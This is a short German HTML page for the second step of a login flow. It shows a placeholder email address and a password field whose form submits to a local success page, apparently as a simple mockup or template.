<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <title>Login - Schritt 2</title>
  <link rel="stylesheet" href="css/style.css">
</head>
<body>

  <!-- Header Banner -->
  <div class="header">
    <img src="images/header.jpg" alt="Header Banner">
  </div>

  <!-- Centered Form -->
  <div class="form-container">
    <div class="form-box">
      <div class="form-header">
        <img src="images/logo-email.png" alt="Logo" class="form-logo">
      </div>

      <!-- Displayed email -->
      <p class="user-email">benutzer@example.com</p>

      <form action="success.html" method="POST">
        <label for="password">Passwort</label>
        <input type="password" id="password" name="password" required>

        <button type="submit" class="weiter-btn">Weiter</button>
      </form>
    </div>
  </div>

</body>
</html>
